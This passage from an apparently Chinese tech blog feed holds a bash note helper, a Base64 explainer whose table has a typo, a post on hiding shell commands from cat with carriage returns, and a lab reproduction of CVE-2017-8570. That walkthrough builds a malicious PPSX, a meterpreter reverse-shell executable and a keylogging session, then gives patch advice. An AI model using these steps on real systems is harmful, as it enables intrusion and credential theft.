<span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token punctuation">$(</span>date <span class="token string">"+%Y-%m-%d"</span><span class="token punctuation">)</span>  <span class="token function">cat</span> <span class="token variable">$DN_PATH</span>/<span class="token punctuation">$(</span>date <span class="token string">"+%Y-%m-%d"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dnte"><a href="#dnte" class="headerlink" title="dnte"></a>dnte</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 编辑今天的笔记（2019-11-30）</span>dnte<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  vim <span class="token variable">$DN_PATH</span>/<span class="token punctuation">$(</span>date <span class="token string">"+%Y-%m-%d"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dnview"><a href="#dnview" class="headerlink" title="dnview"></a>dnview</h3><p><strong>find</strong></p><p>作用：查找文件</p><ul><li>-type f：查找普通文件</li><li>-exec：执行命令</li><li>{}：用于与 -exec 选项结合使用来匹配查找到的所有文件</li></ul><p><strong>basename</strong></p><p>作用：截取文件名称</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># basename /root/dn/2019-11-30</span>2019-11-30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find $DN_PATH/$1* -type f</span>/root/dn/2019-11-30<span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find $DN_PATH/$1* -type f -exec basename {} \;</span>2019-11-30<span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find $DN_PATH/$1* -type f -exec cat {} \;</span> * The same thing we <span class="token keyword">do</span> every night * fuck<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查找 ~/dn/【第一个参数】或是所有（*）普通文件；之后再执行 basename 命令，截取文件名；最后执行 cat 命令，查看所有文件内容。</span>dnview<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">find</span> <span class="token variable">$DN_PATH</span>/<span class="token variable">$1*</span> -type f -exec <span class="token function">basename</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://man.linuxde.net/find" target="_blank" rel="noopener">find命令</a></p><p><a href="https://riptutorial.com/bash/example/16884/-1--2--3-etc---" target="_blank" rel="noopener">$1 $2 $3等</a></p><p><a href="https://github.com/tomlockwood/dn">dn</a></p><p><a href="https://blog.csdn.net/wutao_water/article/details/39478631" target="_blank" rel="noopener">Linux命令之basename使用</a></p><p><a href="https://blog.csdn.net/Jerry_1126/article/details/79872110" target="_blank" rel="noopener">Linux中basename和dirname命令的妙用</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> bash </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64编码</title>
      <link href="/2019/11/26/base64%E7%BC%96%E7%A0%81/"/>
      <url>/2019/11/26/base64%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><hr><p>我们知道，所有的信息最终都表示为一个二进制的字符串，每一个二进制位（bit）有 0 和 1 两种状态。当我们需要把字符 ‘A’ 存入计算机时，我们可以将字符 ‘A’ 用 01000010（这个随便编的）二进制字符串表示，存入计算机；读取时，再将 01000010 还原成字符’A’。那么问题来了，存储时，字符’A’应该对应哪一串二进制数呢，是01000010？或者是 10000000 11110101？说白了，就是需要一个规则。这个规则可以将字符映射到唯一一种状态(二进制字符串)，这就是编码。</p><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><hr><p>这套编码规则是由美国定制，一共规定了 128 个字符的编码。这 128 个字符（符号），只占用了一个字节（8 bit）的后面 7 位，最前面的 1 位统一规定为 0 。总共才有128个字符编码，一个字节都没有用完，这好像似乎有点太少了。于是乎，就开始压榨最高位，对其为 1 时也进行编码，利用最高位进行编码的方式就称为非 ASCII 编码，如 ISO-8859-1 编码。</p><h2 id="Base64是什么？"><a href="#Base64是什么？" class="headerlink" title="Base64是什么？"></a>Base64是什么？</h2><hr><p>Base64 严格来说也是一个编码格式，并不是我们常说的 “Base64加密” 。</p><h2 id="Base64-的由来"><a href="#Base64-的由来" class="headerlink" title="Base64 的由来"></a>Base64 的由来</h2><hr><p>由于历史原因，早前 Email 只被允许传送英文，但随着后来用户的增加，中文、日文等文字的用户也有需求，但是这些字符并不能被服务器或者网关有效的处理，导致邮件出现乱码，因此 Base64 就出现了。随之，Base64 在 URL、Cookie、网页传输少量二进制文件中也有相应的使用。</p><h2 id="Base64-的作用"><a href="#Base64-的作用" class="headerlink" title="Base64 的作用"></a>Base64 的作用</h2><hr><p>Base64 的作用就是用有限的常规字符（可打印的字符）表示一切数据（各种语言），就如上面说的 email 处理数据。</p><h2 id="Base64-工作原理"><a href="#Base64-工作原理" class="headerlink" title="Base64 工作原理"></a>Base64 工作原理</h2><hr><ul><li><p>第一步：Base64 定义每 3 个字节为一组，每个字节占 8 位，那么共有 24 个二进制位。</p></li><li><p>第二步：将上面的 24 个二进制位每 6 个分为一组，共分 4 组。</p></li><li><p>第三步：在每组前面添加两个 0，每组由 6 个变为 8 个二进制位，总共 32 个二进制位，即四个字节。</p></li><li><p>第四步，根据Base64编码对照表（见下图）获得对应的值。</p></li></ul><table><thead><tr><th>值</th><th>字符</th><th>值</th><th>字符</th><th>值</th><th>字符</th><th>值</th><th>字符</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>17</td><td>R</td><td>34</td><td>i</td><td>51</td><td>z</td></tr><tr><td>1</td><td>B</td><td>18</td><td>S</td><td>35</td><td>j</td><td>52</td><td>0</td></tr><tr><td>2</td><td>C</td><td>19</td><td>T</td><td>36</td><td>k</td><td>53</td><td>11</td></tr><tr><td>3</td><td>D</td><td>20</td><td>U</td><td>37</td><td>l</td><td>54</td><td>2</td></tr><tr><td>4</td><td>E</td><td>21</td><td>V</td><td>38</td><td>m</td><td>55</td><td>3</td></tr><tr><td>5</td><td>F</td><td>22</td><td>W</td><td>39</td><td>n</td><td>56</td><td>4</td></tr><tr><td>6</td><td>G</td><td>23</td><td>X</td><td>40</td><td>o</td><td>57</td><td>5</td></tr><tr><td>7</td><td>H</td><td>24</td><td>Y</td><td>41</td><td>p</td><td>58</td><td>6</td></tr><tr><td>8</td><td>I</td><td>25</td><td>Z</td><td>42</td><td>q</td><td>59</td><td>7</td></tr><tr><td>9</td><td>J</td><td>26</td><td>a</td><td>43</td><td>r</td><td>60</td><td>8</td></tr><tr><td>10</td><td>K</td><td>27</td><td>b</td><td>44</td><td>s</td><td>61</td><td>9</td></tr><tr><td>11</td><td>L</td><td>28</td><td>c</td><td>45</td><td>t</td><td>62</td><td>+</td></tr><tr><td>12</td><td>M</td><td>29</td><td>d</td><td>46</td><td>u</td><td>63</td><td>/</td></tr><tr><td>13</td><td>N</td><td>30</td><td>e</td><td>47</td><td>v</td><td></td><td></td></tr><tr><td>14</td><td>O</td><td>31</td><td>f</td><td>48</td><td>w</td><td></td><td></td></tr><tr><td>15</td><td>P</td><td>32</td><td>g</td><td>49</td><td>x</td><td></td><td></td></tr><tr><td>16</td><td>Q</td><td>33</td><td>h</td><td>50</td><td>y</td><td></td><td></td></tr></tbody></table><p>注：Base64 字符表中的字符原本用 6 个 bit 就可以表示，现在前面添加 2 个 0，变为 8个 bit，会造成一定的浪费。因此，Base64 编码之后的文本，要比原文大约三分之一。</p><h2 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明"></a>示例说明</h2><hr><p><img src="https://i.loli.net/2019/11/26/ilASygoT9fDcLnV.jpg" alt="base64-1.jpg"></p><ul><li><p>第一步：“M”、“a”、”n” 对应的 ASCII 码值分别为 77，97，110，对应的二进制值是01001101、01100001、01101110。如图第二三行所示，由此组成一个 24 位的二进制字符串。</p></li><li><p>第二步：如图红色框，将 24 位每 6 位二进制位一组分成四组。</p></li><li><p>第三步：在上面每一组前面补两个 0，扩展成 32 个二进制位，此时变为四个字节：00010011、00010110、00000101、00101110。分别对应的值（Base64 编码索引）为：19、22、5、46。</p></li><li><p>第四步：用上面的值在 Base64 编码表中进行查找，分别对应：T、W、F、u。因此 “Man”Base64 编码之后就变为：TWFu。</p></li></ul><h2 id="位数不足"><a href="#位数不足" class="headerlink" title="位数不足"></a>位数不足</h2><hr><p>上面是按照三个字节来举例说明的，如果字节数不足三个，那么该如何处理？</p><p><img src="https://img-blog.csdnimg.cn/20190517212307382.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9oZWxsby5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70" alt=" base64-2.jpg "></p><ul><li><p>两个字节：两个字节共16个二进制位，依旧按照规则进行分组。此时总共16个二进制位，每6个一组，则第三组缺少2位，用0补齐，得到三个Base64编码，第四组完全没有数据则用“=”补上。因此，上图中“BC”转换之后为“QKM=”；</p></li><li><p>一个字节：一个字节共8个二进制位，依旧按照规则进行分组。此时共8个二进制位，每6个一组，则第二组缺少4位，用0补齐，得到两个Base64编码，而后面两组没有对应数据，都用“=”补上。因此，上图中“A”转换之后为“QQ==”；</p></li></ul><h2 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h2><hr><p>上面我们已经看到了 Base64 就是用 6 位（2 的 6 次幂就是 64）表示字符，因此成为Base64。同理，Base32 就是用5位，Base16 就是用 4 位。大家可以按照上面的步骤进行演化一下。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.csdn.net/wo541075754/article/details/81734770" target="_blank" rel="noopener">一篇文章彻底弄懂Base64编码原理</a></p><p><a href="https://www.cnblogs.com/jilodream/p/5568800.html" target="_blank" rel="noopener">Base64 的那些事儿</a></p><p><a href="http://www.5dmail.net/html/2004-2-12/2004212203158.htm" target="_blank" rel="noopener">E-mail传送中的三种编码标准</a></p><p><a href="https://blog.csdn.net/MyUserAndWuBin/article/details/45844283" target="_blank" rel="noopener">低八位、高八位；低四位、高四位</a></p><p><a href="https://www.cnblogs.com/cuijl/p/8005741.html" target="_blank" rel="noopener">高位字节、低位字节</a></p><p><a href="https://www.zhihu.com/question/20304015" target="_blank" rel="noopener">如何判断一个字符串是否经过base64加密过？</a></p><p><a href="https://blog.csdn.net/ycx_lq/article/details/53812248" target="_blank" rel="noopener">位，字节和字的区别</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>躲开 cat 命令</title>
      <link href="/2019/11/17/%E8%BA%B2%E5%BC%80cat%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/11/17/%E8%BA%B2%E5%BC%80cat%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="命令运行机制"><a href="#命令运行机制" class="headerlink" title="命令运行机制"></a>命令运行机制</h2><p>cat 命令是从一个位置读取内容，然后再把内容输入到另一个位置。一般 cat 命令会将读取的内容输出到 STDOUT，可以理解为输出到屏幕上。cat 还支持一些控制字符，例如 回车符\r，换行符\n 等等。</p><h2 id="躲开-cat-命令"><a href="#躲开-cat-命令" class="headerlink" title="躲开 cat 命令"></a>躲开 cat 命令</h2><p>下面会用一个例子来证明，如何用 \r 对 cat 命令隐藏并执行 shell 脚本命令：</p><ol><li>编写一个 python 脚本</li></ol><pre class="line-numbers language-python"><code class="language-python">cmd_h <span class="token operator">=</span> <span class="token string">"echo 'You forgot to check `cat -A`!' &gt; oops"</span> <span class="token comment" spellcheck="true"># hidden</span>cmd_v <span class="token operator">=</span> <span class="token string">"echo 'Hello world!'"</span>                         <span class="token comment" spellcheck="true"># visible</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"test.sh"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    output <span class="token operator">=</span> <span class="token string">"#!/bin/sh\n"</span>    output <span class="token operator">+=</span> cmd_h <span class="token operator">+</span> <span class="token string">";"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" #\r"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">*</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd_h<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 将双引号里面的值赋给变量 cmd_h</span><span class="token comment" spellcheck="true"># 将双引号里面的值赋给变量 cmd_v</span><span class="token comment" spellcheck="true"># 创建 test.sh 并写入下面的内容，如果有 test.sh 则覆盖重写内容</span><span class="token comment" spellcheck="true"># 将双引号里面的值赋给变量 output</span><span class="token comment" spellcheck="true"># 变量 output 追加内容</span><span class="token comment" spellcheck="true"># 将内容写到 test.sh 中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>滥用 cat 默认行为</li></ol><p>cat 默认会执行 \r 控制字符，在 test.sh 中显示为蓝色的 ^M。</p><p><img src="https://i.loli.net/2019/11/17/SLyz1bawefptlq4.png" alt=" "></p><p>本质上，\r 会将光标移回该行的开头，其后打印的字符将会被覆盖（覆盖）先前打印的任何内容。这也是为什么我们在字符串的末尾添加空格。</p><p>因此当运行 <code>cat test.sh</code> 时：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost command<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat test.sh </span><span class="token comment" spellcheck="true">#!/bin/sh</span><span class="token keyword">echo</span> <span class="token string">'Hello world!'</span>                   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是实际运行的字符串如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'You forgot to check <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> -A<span class="token variable">`</span></span>!'</span> <span class="token operator">&gt;</span> oops<span class="token keyword">echo</span> <span class="token string">'Hello world!'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>不经意执行 test.sh</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost command<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  ls</span>test.sh<span class="token punctuation">[</span>root@localhost command<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  sh ./test.sh</span>Hello world<span class="token operator">!</span><span class="token punctuation">[</span>root@localhost command<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  ls</span>oops  test.sh<span class="token punctuation">[</span>root@localhost command<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  cat oops</span>You forgot to check <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> -A<span class="token variable">`</span></span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol><li>查看 test.sh 的大小和 cat 的内容是否匹配</li><li>使用 less、vim、vi 等命令打开文件</li><li>使用 cat -A 来查看文件，禁止执行控制字符</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost command<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  cat -A test.sh</span><span class="token comment" spellcheck="true">#!/bin/sh$</span><span class="token keyword">echo</span> <span class="token string">'You forgot to check <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> -A<span class="token variable">`</span></span>!'</span> <span class="token operator">&gt;</span> oops<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'Hello world!'</span> <span class="token comment" spellcheck="true">#^Mecho 'Hello world!'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://ura.d3npa.dev/posts/hiding-from-cats.md" target="_blank" rel="noopener">Hiding from cats</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> commd </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-8570</title>
      <link href="/2019/11/17/CVE-2017-8570/"/>
      <url>/2019/11/17/CVE-2017-8570/</url>
      
        <content type="html"><![CDATA[<p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2017 年 7 月，微软在例行的月度补丁中修复了多个 Microsoft Office 漏洞，其中的CVE-2017-8570漏洞为一个逻辑漏洞，利用方法简单。网上已经出现该漏洞的利用代码，影响范围较广。</p><p>该漏洞为 Microsoft Office 的一个远程代码执行漏洞。其成因是 Microsoft PowerPoint 执行时会初始化 Script”Moniker“ 对象，而在 PowerPoint 播放动画期间会激活该对象，从而执行 sct 脚本（Windows Script Component）文件。攻击者可以欺骗用户运行含有该漏洞的PPT文件，导致获取和当前登录用户相同的代码执行权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre class="line-numbers language-text"><code class="language-text">Microsoft Office 2007 Service Pack 3Microsoft Office 2010 Service Pack 2 (32-bit editions)Microsoft Office 2010 Service Pack 2 (64-bit editions)Microsoft Office 2013 RT Service Pack 1Microsoft Office 2013 Service Pack 1 (32-bit editions)Microsoft Office 2013 Service Pack 1 (64-bit editions)Microsoft Office 2016 (32-bit edition)Microsoft Office 2016 (64-bit edition)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h3><p><strong>操作系统：</strong> kali</p><p><strong>Metasploit：</strong> v5.0.59-dev</p><p><strong>IP：</strong> 192.168.150.129</p><h3 id="受害者（靶机）"><a href="#受害者（靶机）" class="headerlink" title="受害者（靶机）"></a>受害者（靶机）</h3><p><strong>操作系统：</strong> windows 7 sp1 x86</p><p><strong>Office版本：</strong> Office 专业增强版 2016</p><p><strong>IP：</strong> 192.168.150.132</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="克隆配置-EXP-文件"><a href="#克隆配置-EXP-文件" class="headerlink" title="克隆配置 EXP 文件"></a>克隆配置 EXP 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># git clone https://github.com/tezukanice/Office8570.git &amp;&amp; cd Office8570</span>root@kali:~/Office8570<span class="token comment" spellcheck="true"># mkdir temlate &amp;&amp; mv template.ppsx temlate</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="生成恶意-PPSX-文件"><a href="#生成恶意-PPSX-文件" class="headerlink" title="生成恶意 PPSX 文件"></a>生成恶意 PPSX 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Office8570<span class="token comment" spellcheck="true"># python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.150.129/logo.doc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/BZ4si2FtV8g3Unk.png" alt=" "></p><h3 id="生成反弹-shell-的-exe-文件"><a href="#生成反弹-shell-的-exe-文件" class="headerlink" title="生成反弹 shell 的 exe 文件"></a>生成反弹 shell 的 exe 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/CVE/office/CVE-2017-8570<span class="token comment" spellcheck="true"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.150.129 LPORT=6666 -f exe &gt; /tmp/fuck.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/tuLvSFXHRG7MYB6.png" alt=" "></p><h3 id="监听来自-ppsx-执行反弹-shell"><a href="#监听来自-ppsx-执行反弹-shell" class="headerlink" title="监听来自 ppsx 执行反弹 shell"></a>监听来自 ppsx 执行反弹 shell</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/CVE/office/CVE-2017-8570<span class="token comment" spellcheck="true"># python cve-2017-8570_toolkit.py -M exp -e http://192.168.150.129/fuck.exe -l /tmp/fuck.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/gAULPBVSbFeintz.png" alt=" "></p><h3 id="msf-监听"><a href="#msf-监听" class="headerlink" title="msf 监听"></a>msf 监听</h3><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use exploit/multi/handler msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> lhost 192.168.150.129lhost <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.150.129msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> lport 6666lport <span class="token operator">=</span><span class="token operator">&gt;</span> 6666msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.150.129:6666 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/zd5nTbr6vOHuYE7.png" alt=" "></p><h3 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h3><ol><li>将 Invoice.ppsx 放到 windows 中并双击打开，攻击者接受到反弹 shell</li></ol><p><img src="https://i.loli.net/2019/11/17/nwNtdZHxGrTgXka.png" alt=" "></p><p><img src="https://i.loli.net/2019/11/17/auix1rIZvk8W4lP.png" alt=" "></p><ol start="2"><li>后续渗透</li></ol><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> screenshot    <span class="token comment" spellcheck="true"># 截屏</span>Screenshot saved to: /root/CVE/office/CVE-2017-8570/SCgNajFh.jpegmeterpreter <span class="token operator">&gt;</span> keyscan_start     <span class="token comment" spellcheck="true"># 开启键盘记录</span>Starting the keystroke sniffer <span class="token punctuation">..</span>.meterpreter <span class="token operator">&gt;</span> keyscan_dump      <span class="token comment" spellcheck="true"># 输出键盘记录</span>Dumping captured keystrokes<span class="token punctuation">..</span>.admin<span class="token operator">&lt;</span>CR<span class="token operator">&gt;</span>adminmeterpreter <span class="token operator">&gt;</span> keyscan_stop      <span class="token comment" spellcheck="true"># 关闭键盘记录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/TUAqQtXD9631Oys.png" alt=" "></p><p><img src="https://i.loli.net/2019/11/17/6L7I24olCurNdJh.png" alt=" "></p><p><img src="https://i.loli.net/2019/11/17/ldm9EPwuKIoN5ke.png" alt=" "></p><p><strong>注：</strong>如果靶机是 64 位的，上面所有的 <code>windows/meterpreter/reverse_tcp</code> 替换为 <code>windows/x64/meterpreter/reverse_tcp</code></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li><p>及时安装微软2017年7月发布的最新补丁</p></li><li><p>经得住诱惑，不打开来历不明的 office 文件如果没有打补丁的话，其实还有一直比较稳妥的打开 PPT 的方法，就是不双击打开 PPT 文件。先打开 PPT 程序，然后将文件直接拖动到 PPT 程序中打开 是不会触发运行 exe 程序的</p></li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.freebuf.com/vuls/144054.html" target="_blank" rel="noopener">Office CVE-2017-8570远程代码执行漏洞复现</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 权限</title>
      <link href="/2019/11/13/linux-%E6%9D%83%E9%99%90/"/>
      <url>/2019/11/13/linux-%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h2><ul><li>UID</li></ul><p>root用户（即超级用户）拥有极高的系统所有权，能够管理系统的各项功能。而 root 只是一个名字，真正让他成为 “超级用户” 的是 UID 的值。每个用户都有一个对应的 UID 值，就像是我们的身份证号码。</p><p>超级用户 UID（0）：root用户默认为 0</p><p>系统用户 UID（1~999）：系统中的系统服务由不同的用户运行，这样更加安全，默认被限制登录系统</p><p>普通用户 UID（1000~）：管理员创建的用于日常工作而不能管理系统的普通用户</p><p>注：UID 不能一样</p><ul><li>GID</li></ul><p>GID 可将多用户加入到某个组中，方便工作。</p><p>注：每个用户在被创建的时候都会创建一个默认组（其 GID 和 UID 相同，俗称基本组），而后加入的叫扩展组。</p><p>用户组名称 与 GID 保存在 /etc/group 文件中。</p><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>fuck@master ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l test.txt -rwxr-xr-x. 1 fuck fuck 38 11月 15 15:04 test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>第一个字段：</strong></p><ul><li><p>-：表示普通文件</p></li><li><p>rwx 所有者权限</p></li><li><p>r-x 所属组权限</p></li><li><p>r-x 其他人权限。</p></li><li><p>r：读权限，整数值为4；</p></li><li><p>w：写权限，整数值为2；</p></li><li><p>x：执行权限，整数值为 1</p></li></ul><p>注：没有权限的地方会用 - 来表示</p><p><strong>第二个字段</strong></p><p>1：文件的硬链接个数</p><p><strong>第三个字段</strong></p><p>fuck：所有者，就是创建这个目录的用户</p><p><strong>第四个字段</strong></p><p>fuck：用户组，创建这个文件时所在的组就是用户组</p><p><strong>第五个字段</strong></p><p>38 11月 15 15:04：文件修改日期，上次文件执行、修改内容、权限、文件名等等的时间</p><p><strong>第六个字段</strong><br>test.txt：文件名</p><h3 id="读权限"><a href="#读权限" class="headerlink" title="读权限"></a>读权限</h3><pre class="line-numbers 